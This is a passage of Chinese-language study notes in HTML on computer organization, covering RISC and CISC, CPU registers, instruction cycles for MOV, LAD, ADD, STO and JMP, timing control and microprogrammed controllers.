title="陷阱（TRAP）指令"></a>陷阱（TRAP）指令</h4><p>陷阱是一种意外事故中断，它的目的<code>不是请求CPU正常处理中断</code>，<code>而是为了把发生的故障通知CPU，并根据故障的情况转入相应的故障处理程序</code>。陷阱指令就是为实现这个任务而设置的。</p><p>一般为<code>隐含指令</code></p><h4 id="特权指令"><a href="#特权指令" class="headerlink" title="特权指令"></a>特权指令</h4><p>特权指令是指具有特殊权限的指令。这类指令<code>只用于操作系统或其他系统软件</code>，一般不直接提供给用户使用。<br>在多用户、多任务的计算机系统中特权指令必不可少。它主要用于系统资源的分配和管理</p><h4 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h4><p>状态寄存器置位、复位指令、测试指令、暂停指令，空操作指令，以及其他一些系统控制用的特殊指令。 </p><h3 id="精简指令系统计算机"><a href="#精简指令系统计算机" class="headerlink" title="精简指令系统计算机"></a>精简指令系统计算机</h3><p><code>RISC，精简指令系统计算机</code><br>提供数目较少、格式与功能简单、运行高效的指令<br><code>特点</code>：追求的是计算机控制器实现简单，运行高速，更容易在单块超大规模集成电路的芯片内制做出来</p><hr><p><code>CISC，复杂指令系统计算机</code><br><code>特点</code>：指令条数多，格式多样，寻址方式复杂，每条指令的功能强。汇编程序设计容易些，但计算机控制器的实现困难多，很多指令被使用的机会并不多。</p><p>精简指令系统计算机<code>不仅是要简化指令系统</code>，而且要通过简化指令系统使计算机的<code>硬件结构变得简单合理</code>，以<code>提高运算速度</code>，<strong>最有效的办法是减少指令的执行周期数</strong></p><p>RISC技术的<strong>实质</strong>是要求<code>指令系统简化</code>，<code>尽量使用寄存器-寄存器操作指令，指令操作在一个周期内完成，指令格式力求一致，以利于提高编译的效率</code></p><h4 id="一些性能指标"><a href="#一些性能指标" class="headerlink" title="一些性能指标"></a>一些性能指标</h4><p>若设高级语言程序经编译后在机器上运行的<code>机器指令数为I</code>；每条机器指令执行时所需要的<code>平均机器周期数是C</code>；每个机器周期的<code>执行时间为T</code>；则计算机执行程序的时间<code>P=I×C×T</code></p><h4 id="RISC的主要特点"><a href="#RISC的主要特点" class="headerlink" title="RISC的主要特点"></a>RISC的主要特点</h4><p>RISC继承了CISC的成功技术，又克服了CISC的缺点，其发展速度很快</p><ol><li>选取使用频率最高的一些简单指令和很有用但不复杂的指令；</li><li>指令长度固定，指令格式种类少，寻址方式种类少；</li><li>只有取数/存数指令可以访问存储器，其余指令的操作都在寄存器之间进行</li><li>大部分指令在一个机器周期内完成，复杂指令可化为简单指令序列，把它当成子程序使用；</li><li>CPU中通用寄存器很多；</li><li>控制器采用组合逻辑部件，而不采用微程序控制；</li><li>取指令和执行指令采用流水线重叠操作，提高了运行速度和信息处理能力；</li><li>使存储器靠近CPU，以减少传送数据的时间延迟，并在主存和外存之间设置中间速度存储器，以加速主存和外存之间的信息传送；</li><li>以简单有效的方式支持高级语言</li></ol><h4 id="指令系统的兼容问题"><a href="#指令系统的兼容问题" class="headerlink" title="指令系统的兼容问题"></a>指令系统的兼容问题</h4><ol><li><code>CISC的兼容性</code><br>当前，计算机公司生产的<code>各种CISC都能够实现软件兼容</code>，新型号或高档机包含了旧型号或低档机的全部指令并加以扩充。因此，用户的目标码程序可以不加修改直接在新机器上运行。</li><li><code>RISC的兼容性</code><br>RISC机则将指令做了简化，数量减少，格式也不同，与老机器不能兼容。因为大多数用户的程序是用高级语言编写的，重新在RISC上编译一次即可运行。<br>有的公司仍然考虑到目标码兼容的问题，例如HP公司开发的目标码翻译器与浮点数转换软件等，可使目标码程序在采用RISC技术的精密体系计算机中运行。    </li></ol><h1 id="中央处理器"><a href="#中央处理器" class="headerlink" title="中央处理器"></a>中央处理器</h1><h2 id="CPU的功能和组成"><a href="#CPU的功能和组成" class="headerlink" title="CPU的功能和组成"></a>CPU的功能和组成</h2><h3 id="CPU的功能"><a href="#CPU的功能" class="headerlink" title="CPU的功能"></a>CPU的功能</h3><p><code>指令控制</code>：即<code>程序的顺序控制</code>，程序中指令的相互顺序不能任意颠倒。<br><code>操作控制</code>：<code>一条指令有若干操作信号实现</code>，CPU管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件，从而控制这些部件按指令的要求进行动作。<br><code>时间控制</code>：<code>对指令的各种操作实施时间的定时</code>，各种指令的操作信号均受到时间的严格定时，一条指令的整个执行过程也受到时间的严格定时<br><code>数据加工</code>：<code>对数据进行算术运算和逻辑运算处理</code></p><h3 id="CPU的基本组成"><a href="#CPU的基本组成" class="headerlink" title="CPU的基本组成"></a>CPU的基本组成</h3><p>运算器、控制器、cache</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/CPU%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%BB%84%E6%88%90.png" class=""><h4 id="控制器-1"><a href="#控制器-1" class="headerlink" title="控制器"></a>控制器</h4><p>由<code>程序计数器</code>、<code>指令寄存器</code>、<code>指令译码器</code>、<code>时序产生器</code>和<code>操作控制器</code>组成，完成协调和指挥整个计算机系统的操作<br>主要功能：</p><ol><li>从指令cache中取出一条指令，并指出下一条指令在指令cache中的位置。</li><li>对指令进行译码或测试，并产生相应的操作控制信号，以便启动规定的动作。</li><li>指挥并控制CPU、数据cache和输入/输出设备之间数据流动的方向。</li></ol><h4 id="运算器-1"><a href="#运算器-1" class="headerlink" title="运算器"></a>运算器</h4><p>由<code>算术逻辑单元ALU</code>、<code>通用寄存器</code>、<code>数据缓冲寄存器DR</code>和<code>状态条件寄存器PSW</code>组成，是数据加工处理部件。</p><p>所有操作由控制器发出的控制信号来指挥，是<code>执行部件</code>。</p><p>运算器的两个功能：</p><ol><li>执行所有的算术运算；</li><li>执行所有的逻辑运算，并进行逻辑测试，如零值测试或两个值的比较。</li></ol><p>通常，一个算术运算产生一个运算结果，而一个逻辑运算则产生一个判决。</p><h3 id="CPU中的主要存储器"><a href="#CPU中的主要存储器" class="headerlink" title="CPU中的主要存储器"></a>CPU中的主要存储器</h3><p>CPU中至少包含六类寄存器：</p><ol><li>指令寄存器IR</li><li>程序计数器PC</li><li>数据地址寄存器AR —— 如果不考虑CPU中的cache，需要直接访问存储器，则为存储器地址寄存器MAR</li><li>数据缓冲寄存器DR —— 如果不考虑CPU中的cache，需要直接访问存储器，则为存储器数据寄存器MDR</li><li>通用寄存器组</li><li>状态字寄存器PSW</li></ol><h4 id="指令寄存器IR"><a href="#指令寄存器IR" class="headerlink" title="指令寄存器IR"></a>指令寄存器IR</h4><ol><li>保存当前正在执行的一条指令。当执行一条指令时，先将它从<code>指令cache</code>（指存）读出，传送至IR。</li><li>IR中指令操作码字段经过<code>指令译码器</code>译码，向操作控制器发出具体操作的特定信号。</li><li>在执行该指令的过程中，<code>IR的内容不允许发生变化</code>，以保证实现指令的全部功能。</li></ol><h4 id="程序计数器PC"><a href="#程序计数器PC" class="headerlink" title="程序计数器PC"></a>程序计数器PC</h4><p>又称为<code>指令计数器</code></p><ol><li>程序开始执行前，将<code>起始地址（程序的第一条指令所在的地址）送入PC</code></li><li>执行指令时，CPU自动修改PC的内容，使PC中总是存放<code>将要执行的下一条指令的地址</code>（指令顺序执行，PC+1）</li><li>执行转移指令时，后继指令地址由转qwqw=移指令来规定，因此<code>PC具有寄存器和计数两种功能</code></li></ol><h4 id="数据地址寄存器AR"><a href="#数据地址寄存器AR" class="headerlink" title="数据地址寄存器AR"></a>数据地址寄存器AR</h4><p>保存当前CPU所访问的<code>数据cache</code>（数存）单元的地址</p><h4 id="数据缓冲寄存器DR"><a href="#数据缓冲寄存器DR" class="headerlink" title="数据缓冲寄存器DR"></a>数据缓冲寄存器DR</h4><ol><li>暂存<code>ALU的运算结果</code>，作为ALU运算结果和通用寄存器之间信息传送中时间上的缓冲</li><li>暂存<code>数据存储器读出的一个数据字或来自外部接口的一个数据字</code>，补偿CPU和内存、外围设备之间在操作速度上的差别</li></ol><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><ol><li>ALU执行算术或逻辑运算时，为ALU提供一个工作区。</li><li>通用寄存器组中的寄存器既可以存放源操作数，又可以存放结果操作数，因此在指令格式中要对寄存器号加以编址。</li><li>通用寄存器还可以用作地址指示器、变址寄存器、堆栈指示器等。</li></ol><h4 id="状态字寄存器PSW"><a href="#状态字寄存器PSW" class="headerlink" title="状态字寄存器PSW"></a>状态字寄存器PSW</h4><p>是一个由<code>各种状态条件标志拼凑而成</code>的寄存器。</p><ol><li>保存由<code>算术指令和逻辑指令运算或测试结果建立的各种条件信息</code>，如运算结果进位标志、运算结果溢出标志等。</li><li>保存<code>中断和系统工作状态</code>，以便使CPU和系统能及时了解机器运行状态和程序运行状态</li></ol><h3 id="操作控制器与时序产生器"><a href="#操作控制器与时序产生器" class="headerlink" title="操作控制器与时序产生器"></a>操作控制器与时序产生器</h3><p>寄存器之间传送信息的通路，称为<code>数据通路</code></p><p><code>在各寄存器之间建立数据通路的任务</code>，是由<code>操作控制器</code>来完成的</p><p><code>操作控制器</code>的功能：根据指令操作码和时序信号，产生各种操作控制信号，以便正确地选择数据通路，把有关数据打入到一个寄存器，从而完成取指令和执行指令的控制</p><p><code>操作控制器</code>可以分成两种：</p><ol><li><strong>硬布线控制器</strong>——采用<code>时序逻辑技术</code>实现</li><li><strong>微程序控制器</strong>——采用<code>存储逻辑</code>实现</li></ol><p><code>操作控制器</code>产生的控制信号必须定时，因此必须有<code>时序产生器</code>。<code>时序产生器</code>的<code>作用</code>：对各种操作信号实施时间上的控制。<br>CPU中其他功能部件：中断系统、总线接口等</p><h4 id="硬布线控制器的特点"><a href="#硬布线控制器的特点" class="headerlink" title="硬布线控制器的特点"></a>硬布线控制器的特点</h4><p><code>优点</code>：速度快，可用于速度要求较高的机器中。<br><code>缺点</code>：</p><ol><li>缺乏规整性</li><li>缺乏灵活性</li></ol><h4 id="微程序控制器的特点"><a href="#微程序控制器的特点" class="headerlink" title="微程序控制器的特点"></a>微程序控制器的特点</h4><p>其<code>实质</code>是<code>用程序设计的思想方法来组织操作控制逻辑</code><br>把指令执行所需要的所有控制信号存放在<code>控制存储器</code>中，需要时从这个存储器中读取，存储逻辑可以修改<code>控制存储器</code>中存放的数据，从而修改逻辑功能，速度略慢，有一个寻址和读数据的过程</p><p><code>优点</code>：规整性、灵活性、可维护性好<br><code>缺点</code>：速度慢</p><h2 id="指令周期"><a href="#指令周期" class="headerlink" title="指令周期"></a>指令周期</h2><h3 id="指令周期的基本概念"><a href="#指令周期的基本概念" class="headerlink" title="指令周期的基本概念"></a>指令周期的基本概念</h3><p><code>指令周期</code>：取指令、分析指令到执行完该指令所需的全部时间。<br>各种指令的操作功能不同，因此<code>各种指令的指令周期</code>不尽相同。<br><code>指令周期</code>可以划分为若干个<code>机器周期</code>，每个机器周期完成一个基本操作，又称<code>CPU周期</code>，<code>由一个或多个时钟周期构成</code><br><code>时钟周期</code>：一般指<code>CPU时钟周期</code>，通常定义为计算机主频的倒数，是计算机中最基本的时间单位。</p><p>通常<code>用主存中读取一个指令字的最短时间</code>来规定<code>CPU周期</code>。不同的指令，可能包含<code>不同数目</code>的CPU周期</p><p>在一个<code>CPU周期</code>中，包含若干个相等的时间段，即<code>T周期</code>（称为<code>节拍脉冲</code>，是<code>处理操作的最基本时间单位</code>）<br>节拍常用具有一定宽度的电位信号表示，称之为<code>节拍电位</code><br>节拍的宽度<code>取决于</code>CPU完成一次基本的微操作的时间</p><p>每个机器周期（CPU周期）包含的节拍数可以相等，也可以不等，分别称为<code>定长机器周期</code>（CPU周期）和<code>不定长机器周期</code>（CPU周期）</p><p><code>取指周期</code>：</p><ol><li>从指存取出指令；</li><li>PC+1，为取下一条指令做准备；</li><li>对指令操作码进行译码或测试，以便确定进行什么操作。</li></ol><p><code>执行周期</code>：根据对指令操作码的译码或测试，进行指令所要求的操作</p><h3 id="MOV指令的指令周期"><a href="#MOV指令的指令周期" class="headerlink" title="MOV指令的指令周期"></a>MOV指令的指令周期</h3><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/MOV%E6%8C%87%E4%BB%A4%E7%9A%84%E6%8C%87%E4%BB%A4%E5%91%A8%E6%9C%9F.png" class=""><p>MOV指令是RR型指令，需要两个CPU周期——取指和执行</p><h4 id="取指周期"><a href="#取指周期" class="headerlink" title="取指周期"></a>取指周期</h4><p>假定程序已经装入指存</p><ol><li>程序计数器PC中装入第一条指令地址***</li><li>PC的内容被放到指存地址总线ABUS(I)上，对指存进行译码，并启动读命令</li><li>从<strong>****</strong>号地址读出的MOV指令通过指令总线IBUS装入指令寄存器IR</li><li>PC+1，变成***+1，为取下一条指令做好准备</li><li>IR中的操作码（OP）被译码</li><li>操作控制器OC识别出是MOV指令，至此，取指周期结束</li></ol><p>在执行周期，操作控制器OC将产生相应操作命令</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%8C%87%E4%BB%A4%E5%91%A8%E6%9C%9F.png" class=""><h4 id="执行周期"><a href="#执行周期" class="headerlink" title="执行周期"></a>执行周期</h4><ol><li>操作控制器OC送出控制信号到通用寄存器，选择R1（内容为10）作源寄存器，选择R0作目标寄存器；</li><li>OC送出控制信号到ALU，指定ALU做传送操作；</li><li>OC送出控制信号，打开ALU输出三态门。将R1寄存器作为ALU输出送到数据总线DBUS上</li></ol><p><strong>注意：任意时刻DBUS上只能有一个数据！</strong><br>4. OC送出控制信号，将DBUS上的数据打入数据缓冲寄存器DR（10）；<br>5. OC送出控制信号，将DR中的数据10打入目标寄存器R0，R0的内容由00变成10</p><h3 id="LAD指令的指令周期"><a href="#LAD指令的指令周期" class="headerlink" title="LAD指令的指令周期"></a>LAD指令的指令周期</h3><p>LAD指令是RS型指令，先从指存中取出指令，然后从数存6号单元取出数据100装入通用寄存器R1，原来R1中存放的数据10被更换成100</p><p>由于一次访问指存，一次访问数存，因此LAD指令的指令周期需要3个CPU周期</p><ol><li>取值周期<br>CPU的动作完全与MOV指令取指周期相同，只是PC提供的指令地址102，按此地址从指存中读出“LAD  R1，6”指令放入IR中，然后PC+1，使PC内容变为103，为取下一条ADD指令做好准备</li><li>执行周期<br>操作控制器OC发出控制命令打开IR输出三态门。将指令中的直接地址码6放到数据总线DBUS上<br>OC发出操作命令，将地址码6装入数据地址寄存器AR；<br>OC发出读命令，将数存6号单元中的数100读出到DBUS上<br>OC发出命令，将DBUS上的数据100装入数据缓冲寄存器DR；<br>OC发出命令，将DR中的数100装入通用寄存器R1，覆盖掉R1中原来的数10。至此，LAD指令执行周期结束</li></ol><p><strong>注意：数据总线DBUS上分时进行了地址传送和数据传送，所以需要2个CPU周期</strong></p><h3 id="ADD指令的指令周期"><a href="#ADD指令的指令周期" class="headerlink" title="ADD指令的指令周期"></a>ADD指令的指令周期</h3><p>ADD指令是RR型指令，在运算器中用两个寄存器R1和R2的数据进行加法运算，需要两个CPU周期——取指和执行</p><ol><li>取指周期<br>CPU的动作同MOV、LAD指令。PC提供的指令地址103，按此地址从指存中读出“ADD  R1，R2”指令放入IR中，然后PC+1，使PC内容变为104，为取下一条STO指令做好准备</li><li>执行周期<br>操作控制器OC送出控制命令到通用寄存器，选择R1做源寄存器，R2做目标寄存器；<br>OC送出控制命令到ALU，指定ALU做R1和R2的加法运算<br>OC送出控制命令，打开ALU三态门，运算结果120放到DBUS上<br>OC送出控制命令，将DBUS上的数据打入数据缓冲寄存器DR；将ALU产生的进位信号保存在状态字寄存器PSW中；<br>OC送出控制命令，将DR（120）装入R2，R2中原来的内容20被冲掉。至此，ADD指令执行周期结束</li></ol><h3 id="STO指令的指令周期"><a href="#STO指令的指令周期" class="headerlink" title="STO指令的指令周期"></a>STO指令的指令周期</h3><p>STO指令是RS型指令，先访问指存取出STO指令，然后按（R3）=30地址访问数存，将（R2）=120写入30号单元。</p><p>由于一次访问指存，一次访问数存，因此需要3个CPU周期</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/STO%E6%8C%87%E4%BB%A4%E7%9A%84%E6%8C%87%E4%BB%A4%E5%91%A8%E6%9C%9F.png" class=""><ol><li>取指周期：同MOV、LAD、ADD</li><li>执行周期<br>操作控制器OC送出控制命令到通用寄存器，选择（R3）=30做数据存储器的访问地址<br>OC发出操作命令，打开通用寄存器输出三态门（不经ALU以节省时间），将地址30放到DBUS上；<br>OC发出操作命令，将地址30打入AR，并进行数存地址译码<br>OC发出操作命令到通用寄存器，选择（R2）=120，作为数存的写入数据；<br>OC发出操作命令，打开通用寄存器输出三态门，将数据120放到DBUS上<br>OC发出操作命令，将数据120写入数存30号单元，30号单元中原先的数据40被覆盖。至此，STO指令执行周期结束</li></ol><p><strong>DBUS是单总线结构，先送地址（30），后送数据（120），必须分时传送。因此，执行周期需要两个CPU周期</strong></p><h3 id="JMP指令的指令周期"><a href="#JMP指令的指令周期" class="headerlink" title="JMP指令的指令周期"></a>JMP指令的指令周期</h3><p>JMP指令是一条无条件转移指令，用来改变程序的执行顺序。指令周期为两个CPU周期。</p><ol><li>取指周期<br>同MOV、LAD、ADD、STO。</li><li>执行周期<br>操作控制器OC送出控制命令，打开指令寄存器IR的输出三态门；将IR中的地址码101发送到DBUS上<br>OC送出控制命令，将DBUS上的地址码101打入程序计数器PC中，PC中原先的内容106被更换<br>下一条指令不是从指存106号单元取出，而是转移到101号单元取出。JMP指令执行周期结束</li></ol><h3 id="用方框图语言表示指令周期"><a href="#用方框图语言表示指令周期" class="headerlink" title="用方框图语言表示指令周期"></a>用方框图语言表示指令周期</h3><p><code>方框</code>：一个方框代表一个CPU周期<br><code>方框中的内容</code>：表示数据通路操作或某种控制操作<br><code>菱形符号</code>：某种判别或测试，时间上依附于紧接它的前面一个方框的CPU周期，<code>而不单独占用一个CPU周期</code><br><code>～</code>：表示一条指令已经执行完毕，转入<code>公操作</code>【<code>公操作</code>，就是一条指令执行完毕后，CPU所开始进行的一些操作，这些操作<code>主要是CPU对外围设备请求的处理</code>，如中断处理、通道处理等。<br>】<br>如果外围设备没有向CPU请求交换数据，那么CPU转向指存取下一条指令。</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E7%94%A8%E6%96%B9%E6%A1%86%E5%9B%BE%E8%AF%AD%E8%A8%80%E8%A1%A8%E7%A4%BA%E6%8C%87%E4%BB%A4%E5%91%A8%E6%9C%9F.png" class=""><p><code>所有指令的取指周期是完全相同的</code>，指令的执行周期，由于各条指令的功能不同，所用的CPU周期各不相同<br>DBUS代表数据总线，ABUS（D）代表数存地址总线，ABUS（I）代表指存地址总线，RD（D）代表数存读命令，WE（D）代表数存写命令，RD（I）代表指存读命令。</p><h2 id="时序产生器和控制方式"><a href="#时序产生器和控制方式" class="headerlink" title="时序产生器和控制方式"></a>时序产生器和控制方式</h2><h3 id="时序信号的作用和体制"><a href="#时序信号的作用和体制" class="headerlink" title="时序信号的作用和体制"></a>时序信号的作用和体制</h3><p>从<code>时间</code>上来说，<code>取指令事件发生在指令周期的第一个CPU周期中，即发生在“取指令”阶段，而取数据事件发生在“执行指令”阶段</code></p><p><code>硬布线控制器</code>：主状态周期—节拍电位—节拍脉冲三级体制<br><code>微程序控制器</code>：节拍电位—节拍脉冲二级体制<br>主状态周期：可以用一个触发器的状态持续时间来表示；<br>节拍电位：一个CPU周期。</p><h3 id="时序信号产生器"><a href="#时序信号产生器" class="headerlink" title="时序信号产生器"></a>时序信号产生器</h3><p>时序信号发生器由<code>时钟源</code>、<code>环形脉冲发生器</code>、<code>节拍脉冲读写时序译码逻辑</code>、<code>启停控制逻辑</code>等组成</p><h4 id="时钟源"><a href="#时钟源" class="headerlink" title="时钟源"></a>时钟源</h4><p>用来为环形脉冲发生器<code>提供频率稳定且电平匹配的方波时钟脉冲信号</code>。通常由石英晶体振荡器和与非门组成的正反馈振荡电路组成，其输出送至环形脉冲发生器。</p><h4 id="环形脉冲发生器"><a href="#环形脉冲发生器" class="headerlink" title="环形脉冲发生器"></a>环形脉冲发生器</h4><p><code>产生一组有序的间隔相等或不等的脉冲序列</code>，以便通过译码电路来产生最后所需的节拍脉冲</p><h4 id="节拍脉冲和存储器读-写时序"><a href="#节拍脉冲和存储器读-写时序" class="headerlink" title="节拍脉冲和存储器读/写时序"></a>节拍脉冲和存储器读/写时序</h4><h4 id="启停控制逻辑"><a href="#启停控制逻辑" class="headerlink" title="启停控制逻辑"></a>启停控制逻辑</h4><p>机器一旦接通电源，就会自动产生原始的节拍脉冲信号T1° ~ T4°，然而，只有在启动机器运行的情况下，才允许时序发生器发出CPU工作所需的节拍脉冲T1 ~ T4，对读/写时序信号也需要由启停逻辑加以控制。<br>启动、停机是随机的，使用触发器可以实现启停逻辑。<br><code>当计算机启动时，一定要从第1个节拍脉冲前沿开始工作，停机时一定要在第4个节拍脉冲结束后关闭时序产生器</code></p><h3 id="控制方式"><a href="#控制方式" class="headerlink" title="控制方式"></a>控制方式</h3><p>控制不同操作序列时序信号的方法，称为控制器的<strong>控制方式</strong>，可以分为：<code>同步控制方式</code>、<code>异步控制方式</code>、<code>联合控制方式</code><br>其实质反映了时序信号的定时方式</p><h4 id="同步控制方式"><a href="#同步控制方式" class="headerlink" title="同步控制方式"></a>同步控制方式</h4><p>指令在执行时所需的机器周期数和时钟周期数是固定不变的</p><p>根据不同的情况，选取的方案如下：</p><ol><li><code>采用完全统一的机器周期</code>执行各种不同的指令。因此<code>所有指令周期具有相同的节拍电位数和节拍脉冲数。</code><br>对于简单指令和简单的操作来说，造成时间浪费</li><li><code>采用不定长机器周期。</code><br>将大部分操作安排在一个较短的机器周期内完成，对某些时间紧张的操作，则采取延长机器周期的办法来解决</li><li><code>中央控制和局部控制结合</code>。<br>将大部分指令安排在固定的机器周期完成，称为中央控制；对少数复杂指令（乘、除、浮点运算）采用另外的时序进行定时，称为局部控制</li></ol><h4 id="异步控制方式"><a href="#异步控制方式" class="headerlink" title="异步控制方式"></a>异步控制方式</h4><p>无统一的时序信号<br><code>特点：</code></p><ol><li>每条指令、每个操作控制信号需要多少时间就占用多少时间，因此每条指令的指令周期可由多少不等的机器周期数组成；</li><li>当控制器发出某一操作控制信号后，等待执行部件完成操作后发回“回答”信号，再开始新的操作。</li></ol><p><code>优点</code>：运行速度快<br><code>缺点</code>：控制电路比较复杂</p><h4 id="联合控制方式"><a href="#联合控制方式" class="headerlink" title="联合控制方式"></a>联合控制方式</h4><p>将同步控制方式与异步控制方式结合使用</p><ol><li>大部分操作序列安排在固定的机器周期中，对某些时间难以确定的操作则以执行部件的“回答”信号作为本次操作的结束。</li><li>另一种情况，机器周期的节拍脉冲数固定，但是各条指令所包含的机器周期数不固定。如：<code>微程序控制器采用联合控制方式</code></li></ol><p><code>优点</code>：能保证一定的运行速度<br><code>缺点</code>：电路设计相对复杂  </p><h2 id="微程序控制器"><a href="#微程序控制器" class="headerlink" title="微程序控制器"></a>微程序控制器</h2><h3 id="微程序控制原理"><a href="#微程序控制原理" class="headerlink" title="微程序控制原理"></a>微程序控制原理</h3><h4 id="微命令和微操作"><a href="#微命令和微操作" class="headerlink" title="微命令和微操作"></a>微命令和微操作</h4><p><code>微命令</code>：控制部件通过控制线向执行部件发出的各种控制命令，是<code>构成控制序列的最小单位</code><br>微命令是控制计算机各部件完成某个基本微操作的命令</p><p><code>微操作</code>：执行部件接受微命令后所进行的操作<br>微命令和微操作是一一对应的<br>微命令是微操作的控制信号，微操作是微命令的操作过程<br>微操作是执行部件中最基本的操作</p><p><code>状态测试</code>：执行部件通过反馈线向控制部件反映操作情况，以便使控制部件根据执行部件的“状态”来下达新的微命令</p><p>由于数据通路的结构关系，微操作可分为<code>相容性</code>和<code>相斥性</code>两种。</p><ol><li><code>相容性微操作</code>：能够同时或在同一个CPU周期内并行执行的微操作。</li><li><code>相斥性微操作</code>：是指不能同时或不能在同一个CPU周期内并行执行的微操作。</li></ol><h4 id="微指令和微程序"><a href="#微指令和微程序" class="headerlink" title="微指令和微程序"></a>微指令和微程序</h4><p><code>微指令</code>：机器的一个CPU周期中，一组实现一定操作功能的微命令的组合<br>是微命令的组合，<code>存储在控制器中的控制存储器中</code>；</p><p>一条<code>微指令</code>至少包含两部分信息： </p><ol><li><code>操作控制字段</code>，又称<code>微操作码字段</code>，用以<code>产生某一步操作所需的各个微操作控制信号。</code> </li><li><code>顺序控制字段</code>，又称<code>微地址码字段</code>，用以<code>控制产生下一条要执行的微指令地址。</code></li></ol><p><code>微地址</code> ：存放微指令的控制存储器的单元地址。</p><p><code>微程序</code>：一系列微指令的有序集合，一段微程序对应一条机器指令</p><h4 id="微程序控制器原理框图"><a href="#微程序控制器原理框图" class="headerlink" title="微程序控制器原理框图"></a>微程序控制器原理框图</h4><p>微程序控制器主要由<code>控制存储器</code>、<code>微指令寄存器</code>和<code>地址转移逻辑</code>三大部分组成.其中微指令寄存器分为<code>微地址寄存器</code>和<code>微命令寄存器</code></p><h5 id="控制存储器"><a href="#控制存储器" class="headerlink" title="控制存储器"></a>控制存储器</h5><p>是微程序控制器的<code>核心部件</code>，用来存放实现全部指令系统的微程序，是一种<code>只读型存储器</code>。其性能（包括容量、速度、可靠性等）与计算机的性能密切相关。</p><p>控制存储器的工作周期就是<code>微指令周期</code>，即读出一条微指令并执行微指令的时间总和</p><p>控制存储器的字长就是微指令字的长度，其存储容量视机器指令系统而定，即取决于微程序的数量。<br><code>对控制存储器的要求</code>：速度快，读出周期短。</p><h5 id="微指令寄存器"><a href="#微指令寄存器" class="headerlink" title="微指令寄存器"></a>微指令寄存器</h5><p>用来存放从控制存储器取出的正在执行的微指令，其位数同微指令字长相等，分为<code>微地址寄存器</code>（uMAR）和<code>微命令寄存器</code>。<br><code>微地址寄存器</code>决定将要访问的下一条微指令的地址。<br><code>微命令寄存器</code>保存一条微指令的操作控制字段和判别测试字段的信息。</p><h5 id="地址转移逻辑"><a href="#地址转移逻辑" class="headerlink" title="地址转移逻辑"></a>地址转移逻辑</h5><p>为下一步从控制存储器中读取微指令作准备。<br><code>微程序顺序执行时</code>，下一条微指令的地址直接由微地址寄存器给出。<br><code>微程序出现分支时</code>，通过判别<code>测试字段P</code>和<code>执行部件的“状态条件”反馈信息</code>，修改<code>微地址寄存器</code>的内容，并按改好的内容去读下一条微指令。</p><p><strong>微程序控制器的工作过程</strong></p><ol><li>执行取指令的公共操作<br>取指令的公共操作通常由<code>一段取指微程序来完成</code>，<code>在机器开始运行时，自动将取指微程序的入口微地址送</code>uMAR，并从uCM中读出相应的微指令送入uIR。<br>微指令的操作控制字段产生相关微命令，来控制实现取机器指令的公共操作。<br>取指微程序的入口地址一般为CM的0号单元，当取指微程序执行完后，从主存中取出的机器指令就已存入IR中了。</li><li>由<code>机器指令的操作码字段通过微地址形成部件产生出该机器指令所对应的微程序的入口地址</code>，并送入MAR。</li><li>从uCM中逐条取出对应的微指令并执行，每条微指令都能自动产生下一条微指令的地址。 </li><li>一条机器指令对应的微程序的最后一条微指令执行完毕后，其下一条微指令地址又回到取指微程序的<code>入口地址</code>，从而继续第1）步，以完成取下条机器指令的公共操作。</li></ol><p><em>以上是一条机器指令的执行过程，如此周而复始，直到整个程序的所有机器指令执行完毕</em></p><h4 id="CPU周期与微指令周期的关系"><a href="#CPU周期与微指令周期的关系" class="headerlink" title="CPU周期与微指令周期的关系"></a>CPU周期与微指令周期的关系</h4><p>在串行方式的微程序控制器中，<code>微指令周期</code>等于读出微指令的时间加上执行该微指令的时间<br>为了保证整个机器控制信号的同步，设定一个微指令周期等于CPU周期</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/CPU%E5%91%A8%E6%9C%9F%E4%B8%8E%E5%BE%AE%E6%8C%87%E4%BB%A4%E5%91%A8%E6%9C%9F%E7%9A%84%E5%85%B3%E7%B3%BB.png" class=""><p>一个CPU周期为0.8us，包含四个等间隔的节拍脉冲T1～T4，则每个脉冲宽度为200ns。用T4作为读取微指令的时间，用T1+T2+T3作为执行微指令的时间</p><h4 id="机器指令与微指令的关系"><a href="#机器指令与微指令的关系" class="headerlink" title="机器指令与微指令的关系"></a>机器指令与微指令的关系</h4><p>一条机器指令对应一个微程序，一条机器指令所完成的操作划分成若干条微指令来完成，由微指令进行解释和执行。</p><p>从指令与微指令，程序与微程序，地址与微地址的一一对应关系来看，前者和主存储器有关，后者与控制存储器有关。</p><h3 id="微程序设计技术"><a href="#微程序设计技术" class="headerlink" title="微程序设计技术"></a>微程序设计技术</h3><h4 id="微命令编码"><a href="#微命令编码" class="headerlink" title="微命令编码"></a>微命令编码</h4><p>对微指令中的操作控制字段采用的表示方法</p><ol><li>直接表示法<br>控制字段中的每一位表示一个微命令。<br><code>优点</code>：简单直观，输出直接用于控制<br><code>缺点</code>：控制字段长，如三、四百位<br>控制存储器容量要大</li><li>编码表示法<br>a. 把相斥性微命令编为一组；<br>b. 对微命令进行编码，留出一个代码表示本段不发出微命令；<br>c. 增设微命令译码器。<br><code>优点</code>：可以避免互斥，使指令字大大缩短<br><code>缺点</code>：增加了译码电路，使微程序的执行速度减慢</li></ol><p><strong>目前在微程序控制器设计中，编码表示法使用较普遍</strong><br><code>编码原则</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 